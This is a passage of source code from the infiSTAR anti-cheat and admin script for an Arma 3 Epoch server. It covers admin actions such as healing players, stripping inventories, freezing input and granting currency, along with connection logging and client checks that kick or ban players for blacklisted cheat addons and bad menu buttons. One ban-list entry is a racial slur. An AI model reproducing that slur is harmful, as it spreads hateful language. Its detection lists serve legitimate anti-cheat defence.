										}forEach _attachments;
										if(_wMags)then {
											_newPlyr addMagazine(_x select 4);
										};
									};
								} forEach (_weapons select 1);
								_currWeap = (_weapons select 0);
							};
							{
								if(_x in ['Binocular','Rangefinder'])then {
									_newPlyr addWeapon _x;
								} else {
									_newPlyr linkItem _x;
								};
							}forEach _items;
							{
								_itemSlot = _forEachIndex;
								_itemqtys = _x select 1;
								{
									for '_i' from 1 to (_itemqtys select _forEachIndex) do {
										switch _itemSlot do {
											case 0: { _newPlyr addItemToUniform _x };
											case 1: { _newPlyr addItemToVest _x };
											case 2: { _newPlyr addItemToBackpack _x };
										};
									};
								}forEach (_x select 0);
							}forEach _itemsplayer;
							{
								_itemSlot = _forEachIndex;
								_itemqtys = _x select 1;
								{
									for '_i' from 1 to (_itemqtys select _forEachIndex) do {
										switch _itemSlot do {
											case 0: { _newPlyr addItemToUniform _x };
											case 1: { _newPlyr addItemToVest _x };
											case 2: { _newPlyr addItemToBackpack _x };
										};
									};
								}forEach (_x select 0);
							}forEach _weaponsplayer;
							{
								_newPlyr addMagazine _x;
							}forEach _magazinesAmmo;
							_token = _newPlyr call EPOCH_server_setPToken;
							[_newPlyr, _token] remoteExec ['EPOCH_clientRevive',_player];
						};
					};
					['',{Epoch_canBeRevived = true;},(owner _player),false] call FN_infiSTAR_S;
					_player setVariable['REVIVE',true,true];
				};
			};
		};
		if(_option == 9)exitWith
		{
			_target = _array select 2;
			_target setDamage 0;
			_target setFuel 1;
			_target setBleedingRemaining 0;
			_target setOxygenRemaining 1;
			
			_veh = vehicle _target;
			if((_veh isKindOf 'AllVehicles')&&!((_veh isKindOf 'Epoch_Male_F')||(_veh isKindOf 'Epoch_Female_F')||(_veh isKindOf 'Man')))then
			{
				_veh setDamage 0;
				_veh setFuel 1;
				[
					_veh,
					{_this setFuel 1;},
					owner _veh,
					false
				] call FN_infiSTAR_S;
				"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					_veh call EPOCH_server_save_vehicle;
				"; }; _A3AHstring = _A3AHstring + "
			}
			else
			{
				"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					if(isPlayer _target)then
					{
						"+_clientdo+" = '
							player setBleedingRemaining 0;
							player setOxygenRemaining 1;
							{
								missionNamespace setVariable[format[''EPOCH_player%1'',_x],EPOCH_defaultVars select(EPOCH_customVars find _x)];
							} forEach[''Temp'',''Hunger'',''Thirst'',''Toxicity'',''Stamina'',''HitPoints'',''BloodP''];
							EPOCH_playerEnergy = EPOCH_playerEnergyMax;
						';
						(owner _target) publicVariableClient '"+_clientdo+"';
					};
				"; }; _A3AHstring = _A3AHstring + "
				
				player setVariable['broken', false, false];
				
				[
					'',
					{
						life_brokenLeg = false;
						ruhr_brokenLeg = false;
						player setHit['legs',0];
						player setHitPointDamage ['hitLegs',0];
					},
					owner _target,
					false
				] call FN_infiSTAR_S;
			};
		};
		if(_option == 10)exitWith
		{
			_vehicle = _array select 2;
			_value = _array select 3;
			if (local _vehicle) then {
				_vehicle lock _value;
			} else {
				if (_value) then {
					[_vehicle, true] remoteExec ['EPOCH_client_lockVehicle',(owner _vehicle)];
				} else {
					[_vehicle, false] remoteExec ['EPOCH_client_lockVehicle',(owner _vehicle)];
				};
			};
		};
		if(_option == 11)exitWith
		{
			_target = _array select 2;
			_code = {
				_inventoryP = [];
				{_inventoryP pushBack _x;} forEach (assignedItems player);
				{_inventoryP pushBack _x;} forEach (magazines player);
				{_inventoryP pushBack _x;} forEach (weapons player);
				{_inventoryP pushBack _x;} forEach (primaryWeaponItems player);
				{_inventoryP pushBack _x;} forEach (secondaryWeaponItems player);
				_inventoryP pushBack (primaryWeapon player);
				_inventoryP pushBack (secondaryWeapon player);
				_inventoryP pushBack (uniform player);
				_inventoryP pushBack (vest player);
				_inventoryP pushBack (backpack player);
				_inventoryP pushBack (headgear player);
				_inventoryP pushBack (goggles player);
				{
					player removeItem _x;
					player removeWeapon _x;
					player removeMagazine _x;
					removeUniform player;
					removeVest player;
					removeBackpack player;
					removeHeadgear player;
					removeGoggles player;
					player removePrimaryWeaponItem _x;
					player removeSecondaryWeaponItem _x;
					player unlinkItem _x;
				} forEach _inventoryP;
			};
			['',_code,(owner _target),false] call FN_infiSTAR_S;
		};
		if(_option == 12)exitWith
		{
			_target = _array select 2;
			_value = _array select 3;
			if(!isNil 'EPOCH_defaultVars_SEPXVar')then
			{
				if(!isNull _target)then
				{
					_cIndex = EPOCH_customVars find 'Crypto';
					_vars = _target getVariable['VARS', call EPOCH_defaultVars_SEPXVar];
					_current_crypto = (((_vars select _cIndex) + _value) min 250000) max 0;
					_current_crypto remoteExec ['EPOCH_effectCrypto',(owner _target)];
					_vars set[_cIndex, _current_crypto];
					_target setVariable['VARS', _vars];
				};
			};
		};
		if(_option == 13)exitWith
		{
			_target = _array select 2;
			_value = _array select 3;
			_targetUID = getPlayerUID _target;
			if(_targetUID in _locDevs)exitWith{};
			_code = {for '_i' from 0 to 3 do {disableUserInput _this;};};
			[_value,_code,(owner _target),false] call FN_infiSTAR_S;
		};
		if(_option == 14)exitWith
		{
			(_array select 2) call EPOCH_server_upgradeBUILD;
		};
		if(_option == 15)exitWith
		{
			_target = _array select 2;
			_value = _array select 3;
			_target setVariable['restrained',_value,true];
			if(!_value)then
			{
				_target setVariable['restrained',_value,true];
				_target setVariable['Escorting',_value,true];
				_target setVariable['transporting',_value,true];
				detach _target;
			};
		};
		if(_option == 16)exitWith
		{
			if(isNil'EPOCH_WeatherStaticForecast')then{EPOCH_WeatherStaticForecast=[19,1,[1,1,40],1,[5,5]];};
			_somethingChanged = false;
			_FOG_VALUE = _array select 2;
			if(_FOG_VALUE != fog)then
			{
				EPOCH_WeatherStaticForecast set [2,_FOG_VALUE];
				0 setFog _FOG_VALUE;
			};
			_OVERCAST_VALUE = _array select 3;
			if(_OVERCAST_VALUE != overcast)then
			{
				EPOCH_WeatherStaticForecast set [3,_OVERCAST_VALUE];
				0 setOvercast _OVERCAST_VALUE;
				_somethingChanged = true;
			};
			_RAIN_VALUE = _array select 4;
			if(_RAIN_VALUE != rain)then
			{
				EPOCH_WeatherStaticForecast set [1,_RAIN_VALUE];
				0 setRain _RAIN_VALUE;
				_somethingChanged = true;
			};
			if(_somethingChanged)then{
				"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
				skipTime 1;
				"; }; _A3AHstring = _A3AHstring + "
				simulWeatherSync;
				forceWeatherChange;
			};
		};
		if(_option == 5000)exitWith
		{
			_select = _array select 2;
			_pos = _array select 3;
			if(_select == 0)exitWith{
				_crate = 'Box_IND_AmmoVeh_F' createVehicle _pos;
				_crate setVariable['BIS_enableRandomization',false];
				_crate setVariable['"+_adminbox+"','-1',true];
				_crate setPosATL _pos;
				clearWeaponCargoGlobal _crate;
				clearMagazineCargoGlobal _crate;
				clearBackpackCargoGlobal _crate;
				clearItemCargoGlobal _crate;
				_crate addItemCargoGlobal ['KitPlotPole',1];
				_crate addItemCargoGlobal ['ItemLockbox',1];
				_crate addItemCargoGlobal ['KitTiPi',1];
				_crate addItemCargoGlobal ['KitShelf',1];
				_crate addItemCargoGlobal ['Hatchet',1];
				_crate addItemCargoGlobal ['hatchet_swing',2];
				_crate addItemCargoGlobal ['KitFoundation',4];
				_crate addItemCargoGlobal ['PartPlankPack',4];
				_crate addItemCargoGlobal ['KitWoodFloor',20];
				_crate addItemCargoGlobal ['KitStudWall',16];
				_crate addItemCargoGlobal ['ItemCorrugated',16];
				_crate addItemCargoGlobal ['KitCinderWall',5];
				_crate addItemCargoGlobal ['CinderBlocks',10];
				_crate addItemCargoGlobal ['MortarBucket',4];
				_crate addItemCargoGlobal ['ItemCorrugatedLG',2];
				_crate addItemCargoGlobal ['CircuitParts',3];
				_crate addItemCargoGlobal ['EnergyPackLg',2];
			};
			if(_select > 0)exitWith{
				_crate = 'Box_IND_AmmoVeh_F' createVehicle _pos;
				_crate setVariable['BIS_enableRandomization',false];
				_crate setVariable['"+_adminbox+"','-1',true];
				_crate setPosATL _pos;
				clearWeaponCargoGlobal _crate;
				clearMagazineCargoGlobal _crate;
				clearBackpackCargoGlobal _crate;
				clearItemCargoGlobal _crate;
				
				_arrayforcrate = [];
				switch _select do {
					case 1:{_arrayforcrate = "+str _SupportBox1Content+"};
					case 2:{_arrayforcrate = "+str _SupportBox2Content+"};
					case 3:{_arrayforcrate = "+str _SupportBox3Content+"};
				};
				if(_arrayforcrate isEqualTo [])exitWith{};
				
				{
					if(typeName _x == 'ARRAY')then
					{
						_item = _x select 0;
						_BackPack = getText (configfile >> 'CfgVehicles' >> _item >> 'vehicleClass') == 'BackPacks';
						if(_BackPack)then
						{
							_crate addBackpackCargoGlobal [_item,_x select 1];
						}
						else
						{
							_crate addItemCargoGlobal [_item,_x select 1];
						};
					}
					else
					{
						_item = _x;
						_BackPack = getText (configfile >> 'CfgVehicles' >> _item >> 'vehicleClass') == 'BackPacks';
						if(_BackPack)then
						{
							_crate addBackpackCargoGlobal [_item,1];
						}
						else
						{
							_crate addItemCargoGlobal [_item,1];
						};
					};
				} forEach _arrayforcrate;
			};
		};
		if(_option == 9876)exitWith
		{
			_name = name(_array select 2);
			_puid = getPlayerUID(_array select 2);
			_steamName = '';
			_steamName = [_name,_puid,_clientID] call fnc_resolveSteamName;
			if(_steamName != '')then
			{
				_code = {
					params['_name','_uid',['_steamname','']];
					_log = format['<infiSTAR.de> %1(%2) SteamName is: %3',_name,_uid,_steamname];
					cutText [_log, 'PLAIN DOWN'];
					hint _log;
					systemchat _log;
					diag_log _log;
				};
				[[_name,_puid,_steamname],_code,_clientID,false] call FN_infiSTAR_S;
				
				format['%1(%2) is %3',_name,_puid,_steamname] call FNC_A3_RESOLVESTEAMNAMELOG;
			};
		};
	};
	"+_FNC_PVAH_AdminReq+" = compileFinal ([_FNC_PVAH_AdminReq] call fnc_CompilableString);



	_FNC_AH1311_KICKLOGSPAWN =
	{
		private['_input','_tokenreceived','_arraysent','_netId','_objectFromNetId','_objectName','_objectUID','_name','_puid','_result','_foundtokenid','_puidfound','_belongstoname'];
		_input = _this;
		if(isNil '_input')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'FNC_AH1311_KICKLOGSPAWN _this is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		diag_log format['<infiSTAR.de FNC_AH1311_KICKLOGSPAWN> %1',_this];
		
		_tokenreceived = _this select 0;
		if(isNil '_tokenreceived')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + '_tokenreceived _this is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _tokenreceived != 'STRING')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['_tokenreceived wrong type %1 (v0245)',typeName _tokenreceived];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_arraysent = _this select 1;
		if(isNil '_arraysent')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + '_arraysent _this is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _arraysent != 'ARRAY')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['_arraysent wrong type %1 (v0245)',typeName _arraysent];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_objectFromNetId = objNull;
		_netId = _this select 2;
		if(isNil '_netId')then{_netId='';};
		if(typeName _netId != 'STRING')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['_netId wrong type %1 (v0245)',typeName _netId];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		_objectFromNetId = objectFromNetId _netId;
		
		_name = _arraysent select 0;
		if(isNil '_name')then{_name = 'NAME_ERROR1';};
		if(typeName _name != 'STRING')then{_name = 'NAME_ERROR2';};
		if(_name == '')then{_name = 'NAME_ERROR3';};
		
		_puid = _arraysent select 1;
		if(isNil '_puid')then{_puid = '';};
		if(typeName _puid != 'STRING')then{_puid = '';};
		
		diag_log format['<infiSTAR.de FNC_AH1311_KICKLOGSPAWN> %1(%2) Token %3 - objByNetID %4',_name,_puid,_tokenreceived,_objectFromNetId];
		_objectUID = getPlayerUID _objectFromNetId;
		_objectName = if(alive _objectFromNetId)then{name _objectFromNetId}else{_name};
		
		if!(_puid isEqualTo _objectUID)then
		{
			if!(_objectUID isEqualTo '')then
			{
				_puid = _objectUID;
			};
		}
		else
		{
			if(_objectUID isEqualTo _puid)then
			{
				if!(_name isEqualTo _objectName)then
				{
					diag_log format['<infiSTAR.de FNC_AH1311_KICKLOGSPAWN> %1(%2) PlayerObjectName is not equal to PlayerName!',_name,_puid,_objectName];
					_name = _objectName;
				};
			};
		};
		
		_result = [_puid,_tokenreceived] call "+_server_checkTokenR+";
		if(!_result)exitWith
		{
			_log = format['BadToken (%1)',_tokenreceived];
			
			if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};
			if(isNil'_foundtokenid')then{_foundtokenid = "+_BigTokenArray+" find _tokenreceived};
			if(_foundtokenid > 0)then
			{
				_puidfound = "+_BigTokenArray+" select (_foundtokenid - 1);
				if!(_puidfound isEqualTo '')then
				{
					try
					{
						{
							if(alive _x)then
							{
								if((getPlayerUID _x) isEqualTo _puidfound)then
								{
									throw format['BadToken (%1). Token belongs to: %2(%3) and not %4(%5)',_tokenreceived,name _x,_puidfound,_name,_puid];
								};
							};
						} forEach allPlayers;
					}
					catch
					{
						_log = _exception;
					}
				};
				
			};
			
			diag_log format['<infiSTAR.de FNC_AH1311_KICKLOGSPAWN> %1',_log];
			[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
		};
		
		
		_arraysent set [0,_objectName];
		_arraysent set [1,_puid];
		_arraysent spawn "+_FNC_AH1311_KICKLOG+";
	};
	"+_FNC_AH1311_KICKLOGSPAWN+" = compileFinal ([_FNC_AH1311_KICKLOGSPAWN] call fnc_CompilableString);
	_fnc_serverMassMessage = {
		private['_msg','_unit'];
		_msg = _this select 0;
		_unit = _this select 1;
		"+_massMessage+" = [_msg,0,0.7,10,0];
		(owner _unit) publicVariableClient '"+_massMessage+"';
	};
	fnc_serverMassMessage = compileFinal ([_fnc_serverMassMessage] call fnc_CompilableString);

if(!isNil'infiSTAR_PlayerConnected_id')then{removeMissionEventHandler ['PlayerConnected',infiSTAR_PlayerConnected_id];};
infiSTAR_PlayerConnected_id = addMissionEventHandler ['PlayerConnected',{
params['_id','_uid','_name','_jip','_owner'];
	_mytime = call fnc_getserverTime;
	_log = _mytime + format['Connected: %1(%2 - %3) - time: %4 - serverFPS: %5',call fnc_getSteamNameIfSaved,_uid,_owner,time,diag_fps];
	_log call FNC_A3_CONNECTLOG;

	[_uid,_name,_owner] call fnc_infiSTAR_PlayerLog;


	missionNameSpace setVariable[format['"+_owner_by_uid+"%1',_uid],_owner];
	missionNameSpace setVariable[format['"+_uid_by_owner+"%1',_owner],_uid];
	missionNameSpace setVariable [format['NAME_BY_UID_%1',_uid],_name];
	missionNameSpace setVariable [format['OWNER_BY_UID_%1',_uid],_owner];
	missionNameSpace setVariable [format['UID_BY_OWNER_%1',_owner],_uid];
	missionNameSpace setVariable [format['NAME_BY_ID_%1',_id],_name,true];
	missionNameSpace setVariable [format['UID_BY_ID_%1',_id],_uid,true];
}];
_log = format['infiSTAR_PlayerConnected_id: %1',infiSTAR_PlayerConnected_id];
_log call FNC_A3_CONNECTLOG;


"; if!(_customOnPlayerConnected isEqualTo {})then{ _A3AHstring = _A3AHstring + "
infiSTAR_PlayerConnected_custom_id = addMissionEventHandler ['PlayerConnected',"+str _customOnPlayerConnected+"];
_log = format['infiSTAR_PlayerConnected_custom_id: %1',infiSTAR_PlayerConnected_custom_id];
_log call FNC_A3_CONNECTLOG;
"; }; _A3AHstring = _A3AHstring + "





"; if((_MOD == 'Epoch')&&(_CLG))then{ _A3AHstring = _A3AHstring + "
	addMissionEventHandler['HandleDisconnect',{
		_plyr=_this select 0;
		if(alive _plyr)then
		{
			_plyrUID=_this select 2;
			_name = _this select 3;
			_inCombat = 9001;
			if!("+_inCombatArray+" isEqualTo [])then
			{
				_fid = "+_inCombatArray+" find _plyrUID;
				if(_fid != -1)then
				{
					_inCombat = "+_inCombatArray+" select (_fid+1);
				};
			};
			if(_inCombat == 1)then
			{
				_log = format['%1(%2) - HP: %3 - currentWeapon: %4   @%5%6',_name,_plyrUID,(1-(damage _plyr))*100,currentWeapon _plyr,mapGridPosition _plyr,getPos _plyr];
				'ARMA_LOG' callExtension format['A3_COMBATLOG:%1 (v0245)',_log];
				diag_log ('<infiSTAR.de>CombatLog| '+_log+' (v0245)');
				
				_grid = mapGridPosition _plyr;
				_xpos = _grid select [0,3];
				_ypos = _grid select [3,5];
				"+_massSysMessage+" = format['%1 CombatLogged GPS X/Y: %2/%3 find the dead body!',_name,_xpos,_ypos];
				{(owner _x) publicVariableClient '"+_massSysMessage+"';} forEach allPlayers;
				
				[_plyr,_name] call fnc_HandleDisconnectDead;
			};
		};
	}];
"; }; _A3AHstring = _A3AHstring + "


infiSTAR_PlayerDisconnected_id = addMissionEventHandler ['PlayerDisconnected',{
params['_id','_uid','_name','_jip','_owner'];
	_mytime = call fnc_getserverTime;
	_log = _mytime + format['Disconnected: %1(%2 - %3) - time: %4 - serverFPS: %5',call fnc_getSteamNameIfSaved,_uid,_owner,time,diag_fps];
	_log call FNC_A3_CONNECTLOG;
}];
_log = format['infiSTAR_PlayerDisconnected_id: %1',infiSTAR_PlayerDisconnected_id];
_log call FNC_A3_CONNECTLOG;






_AH_MAIN_BLOCK = {
	_clientName = _this select 0;
	_clientUID = _this select 1;
	if(isNil'"+_AH1311KICKLOG+"')exitWith{
		_log = format['%1(%2) - AntiHack variable is NIL !',_clientName,_clientUID];
		AHKickLog_IS_NIL = _log;publicVariableServer'AHKickLog_IS_NIL';
		(findDisplay 46)closeDisplay 0;
	};
	
	if(!isNil'AH_STARTED_ALREADY')exitWith{
		_log = format['%1(%2) - AH STARTED TWICE !',_clientName,_clientUID];
		AH_STARTED_TWICE = _log;publicVariableServer'AH_STARTED_TWICE';
		(findDisplay 46)closeDisplay 0;
	};
	AH_STARTED_ALREADY = true;
	
	_temptime = diag_tickTime + 30;
	waitUntil {(((getClientStateNumber >= 10)&&(getPlayerUID player != ''))||(diag_tickTime > _temptime))};
	
	_name = _clientName;
	_puid = format['%1',getPlayerUID player];
	if((isNil '_puid')||(isNil '_clientName')||(isNil '_clientUID'))exitWith
	{
		_log = 'No UID';
		NO_UID = 'NO_UID';publicVariableServer 'NO_UID';
		(findDisplay 46)closeDisplay 0;
	};
	if!(_puid isEqualTo _clientUID)exitWith
	{
		_log = format['PlayerUID [%1] is not Equal to Serverside PlayerUID [%2]! (KICKED TO LOBBY)',_puid,_clientUID];
		[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
		(findDisplay 46)closeDisplay 0;
	};
	
	_admins = "+str _admins+";
	profileNamespace setVariable['PUID',nil];
	_PUID_array = profileNamespace getVariable['PUIDS',[]];
	if!(_puid in _admins)then
	{
		_add_Id = _PUID_array pushBackUnique _puid;
		if(_add_Id > -1)then
		{
			profileNamespace setVariable['PUIDS',_PUID_array];saveprofileNamespace;
			if(_PUID_array isEqualTo [_puid])exitWith{};
			_announce = true;{if(_x in _admins)exitWith{_announce = false;};} forEach _PUID_array;
			if(_announce)then
			{
				_log = format['Player changed Steam Accounts - UIDs: %1',_PUID_array];
				[profileName,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
		};

		{
			if(!isNil _x)then
			{
				_log = format['AdminVariable Found: %1',_forEachIndex];
				[profileName,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
				(findDisplay 46)closeDisplay 0;
			};
		} forEach [
			'"+_AH_HackLogArrayRND+"','"+_AH_SurvLogArrayRND+"','"+_AH_AdmiLogArrayRND+"','"+_TMPBAN+"','"+_BigTokenArray+"','"+_MCS+"'
		];
		_badclassesban = ['life_server','devcon','loki_lost_key','pooploop','rscrazzler','rsclistboxvg','vgdialog','sspcm','niggers_die'];
		_badclasseskick = ['a3_m3editor','extdb2','infistar_lifemods','infistar_a3','balca_debug_tool'];
		_cfgPatches = 'true' configClasses (configFile >> 'CfgPatches');
		{
			_configName = configName _x;
			_lconfigName = toLower _configName;
			if(_lconfigName in _badclassesban)then
			{
				_log = format['PBO-Injector found in CfgPatches: %1',_configName];
				[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
			if(_lconfigName in _badclasseskick)then
			{
				_log = format['Bad Addon found in CfgPatches: %1',_configName];
				[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
		} forEach _cfgPatches;
		
		_badclasseskick append _badclassesban;
		_activatedAddons = [];
		{_activatedAddons pushBack (toLower _x)} forEach activatedAddons;
		{
			_addon = _x;
			{
				if(_addon find (toLower _x) != -1)then
				{
					_log = format['Bad Addon found: %1 (%2)',_addon,_x];
					[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
			} forEach _badclasseskick;
		} forEach _activatedAddons;
	};
	
	
	"+_dellocveh+" = nil;'"+_dellocveh+"' addPublicVariableEventHandler compileFinal """+_dellocveh+" = nil;deleteVehicle (vehicle player);"";
	[_name,_puid,_admins] spawn {
		disableSerialization;
		{ctrlDelete ((findDisplay 12) displayCtrl _x);} forEach [1086,1087,1088,1089,1090];
		_name = _this select 0;
		_puid = _this select 1;
		_admins = _this select 2;
		_admin = _puid in _admins;
		_wallgames = 0;
		_lastglitch = time;
		_49openedTimer = 0;
		"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
		_tmpObj = objNull;
		_inCombat = 0;
		"; }; _A3AHstring = _A3AHstring + "
		_excludedButtons = [];
		_excludedButtonsTMP = "+str _excludedButtons+";
		{_excludedButtons pushBack format['Control #%1',_x];} forEach _excludedButtonsTMP;
		
		"; if(_B49)then{ _A3AHstring = _A3AHstring + "
			{
				for '_i' from 0 to (count _x - 1) do
				{
					_ctrlCfg = _x select _i;
					if(getText (_ctrlCfg >> 'action') != '' || getText (_ctrlCfg >> 'onButtonClick') != '')exitWith
					{
						_BTN_TEXT = getText (_ctrlCfg >> 'text');
						if!(_BTN_TEXT in ['RHS - Game Options','AGM Options','MCC keys'])then
						{
							_log = format['BadButton on ESC: %1',_BTN_TEXT];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
				};
			}
			forEach
			[
				configFile >> 'RscDisplayMPInterrupt' >> 'controls',
				configFile >> 'RscDisplayMPInterrupt' >> 'controlsBackground'
			];
		"; }; _A3AHstring = _A3AHstring + "


        "; if(_useTildMenu)then{ _A3AHstring = _A3AHstring + "
        "+_customcommandingMenu+" = [];
        "+_customcommandingMenu+" pushBack ['by infiSTAR.de',true];
        "+_customcommandingMenu+" pushBack ['User Menu', [-1], '', -5, [['expression', '']], '1', '0'];
        "+_customcommandingMenu+" pushBack ['Earplugs in/out', [2], '', -5, [['expression', 'if(isNil''Earplugs'')then{Earplugs=true;1 fadeSound 0.25;systemchat''Earplugs in'';}else{Earplugs=nil;1 fadeSound 1;systemchat''Earplugs out'';};']], '1', '1'];
        if(!isNil 'EPOCH_debugMode')then
        {
            "+_customcommandingMenu+" pushBack ['Stinky Finger', [3], '', -5, [['expression', 'player action[''switchWeapon'', player, player, 100];player playactionNow ''GestureFinger'';']], '1', '1'];
            "+_customcommandingMenu+" pushBack ['EPOCH Debug', [4], '', -5, [['expression', 'EPOCH_debugMode = !EPOCH_debugMode;hint'''';']], '1', '1'];
        };
        _customcommandingMenu = "+_customcommandingMenu+";
        "; }; _A3AHstring = _A3AHstring + "


		_fnc_infiKeyHandler = ""
			private['_dikCode','_shift','_ctrl','_alt','_dikCode','_handled'];
			_dikCode = _this select 1;
			_shift = _this select 2;
			_ctrl = _this select 3;
			_alt = _this select 4;
			_handled = false;
			
			"; if(_useTildMenu)then{ _A3AHstring = _A3AHstring + "
			if(_dikCode == 41)then
			{
				"+_customcommandingMenuOpen+" = true;
				_handled = true;
			};
			"; }; _A3AHstring = _A3AHstring + "

			if(_dikCode in (actionKeys 'TacticalView'))then{ _handled = true; };
			if(_ctrl)then
			{
				if(_dikCode in (actionKeys 'Salute'))then
				{
					player playactionNow 'GestureFinger';
					_handled = true;
				};
			};
			_handled
		"";
		"+_fnc_infiKeyHandler+" = compileFinal _fnc_infiKeyHandler;
		if(str "+_fnc_infiKeyHandler+" != str (compile _fnc_infiKeyHandler))then
		{
			_log = format['fnc_infiKeyHandler changed! %1, %2',"+_fnc_infiKeyHandler+",_fnc_infiKeyHandler];
			[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		"; if(_RDK)then{ _A3AHstring = _A3AHstring + "
			(findDisplay 46) displayAddEventHandler ['KeyDown',"+_fnc_infiKeyHandler+"];
		"; }; _A3AHstring = _A3AHstring + "
		(findDisplay 46) displayAddEventHandler ['KeyUp',"+_fnc_infiKeyHandler+"];
		"; if((_MOD == 'Epoch')&&(_AWL))then{ _A3AHstring = _A3AHstring + "
			_faded = false;
			_lastCall = time + 10;
			_fadeOut = {
				_faded = true;
				TitleText ['!!!\nDO NOT LOOK THROUGH WALLS\n!!!\n\n\n\nAntiHack by infiSTAR.de','BLACK FADED'];
				if(!isNull findDisplay 602)then
				{
					for '_i' from 0 to 3 do{findDisplay 602 closeDisplay 0;closeDialog 0;};
					if(time > _lastCall)then
					{
						_lastCall = time + 10;
						
						_log = format['Player tries to look through a door/wall & probably loot a shelf! @%1 %2',mapGridPosition player,player modelToWorldVisual [0,0,0]];
						[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
					};
				};
			};
			_dis_head = 0.20;
			_dis_weapon_l = 0.20;
			_dis_weapon_r = 0.30;
			_dir_weapon_r = 0;
			_dir_weapon_l = 0;
		"; }; _A3AHstring = _A3AHstring + "

		"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
			_playerhandlers = ['InventoryOpened','InventoryClosed','Take','HandleRating'];
			"; if(_RRH)then{ _A3AHstring = _A3AHstring + "
			_playerhandlers pushBack 'Respawn';
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_RKH)then{ _A3AHstring = _A3AHstring + "
				_playerhandlers pushBack 'Killed';
			"; }; _A3AHstring = _A3AHstring + "
		"; }; _A3AHstring = _A3AHstring + "
		_markertimer = time + 5;




_chatKeyUp = '
disableSerialization;
_name = '+str _name+';
_puid = '+str _puid+';
_admin = '+str _admin+';
_chat = (findDisplay 24) displayCtrl 101;
_txt = ctrlText _chat;
if(_txt isEqualTo ''?'')then{
	_log = format[''BadText on Chat: %1'',_txt];
	[_name,_puid,''HLOG_SKICK'',toArray(_log)] call "+_AH1311KICKLOG+";
	[] spawn "+_AHKickOFF+";
};
_ltxt = toLower _txt;
if(_admin)then
{
	if!(_ltxt isEqualTo '''')then
	{
		if(_ltxt isEqualTo ''!admin'')exitWith
		{
			(findDisplay 24) closeDisplay 0;
			[_name,_puid,''AC'',toArray(_txt)] call "+_AH1311KICKLOG+";
			[] spawn {uiSleep 0.3;(findDisplay 46)closeDisplay 0;};
		};
	};
}
else
{
	if(_ltxt in [format[''.ban %1'',toLower _name],format[''.ban %1 true'',toLower _name],format[''.ban %1 true;'',toLower _name]])then
	{
		(findDisplay 24) closeDisplay 0;
		_log = format[''BadCommand: %1'',_txt];
		[_name,_puid,''BAN'',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
};
if(_ltxt in [''killme'',''/killme'',''kill me'',''/kill me'',''/suicide'',''suicide''])then{
	(findDisplay 24) closeDisplay 0;
	_unit = player;
	{_unit setHitPointDamage [_x,1];} forEach [''HitBody'',''HitHead''];
	uiSleep 1.5;
	if(isNull _unit)exitWith{};
	if(local _unit)then{_unit setPos [0,0,100];};
};
if(_ltxt find ''infishit'' > -1)then{
	(findDisplay 24) closeDisplay 0;
	_log = format[''BadText: %1 [infishit]'',_txt];
	[_name,_puid,''BAN'',toArray(_log)] call "+_AH1311KICKLOG+";
};
"; if(_VDN)then{ _A3AHstring = _A3AHstring + "
	if(_ltxt in [''!vote day'',''/vote day'',''vote day'',''!day'',''/day''])then{
		(findDisplay 24) closeDisplay 0;
		[_name,_puid,''VOTE'',toArray ''DAY''] call "+_AH1311KICKLOG+";
	};
	if(_ltxt in [''!vote night'',''/vote night'',''vote night'',''!night'',''/night''])then{
		(findDisplay 24) closeDisplay 0;
		[_name,_puid,''VOTE'',toArray ''NIGHT''] call "+_AH1311KICKLOG+";
	};
"; }; _A3AHstring = _A3AHstring + "
_txtArray = toArray _txt;if!(_txtArray isEqualTo [])then{if((_txtArray select 0) in [44,36,37,38,92,124,194,176,45,95,60,62])then{_chat ctrlSetText '';};};
false
';
_chatKeyUp_id = -1;

		while{1==1}do
		{
			if(time > _markertimer)then
			{
				_markertimer = time + 5;
				
				_need_hlog = true;
				{
					_marker = _x;
					if(_marker find '_USER_DEFINED' > -1)then
					{
						_markerchannel = _marker select [(count _marker)-1,1];
						if(parseNumber _markerchannel > 2)exitWith{};
						
						_stringsizeSTART = (_marker find '#')+1;
						_stringsizeEND = _marker find '/';
						_markerid = _marker select [_stringsizeSTART,_stringsizeEND - _stringsizeSTART];
						_markerid = parseNumber _markerid;
						
						_shape = markerShape _marker;
						if(_shape isEqualTo 'POLYLINE')then
						{
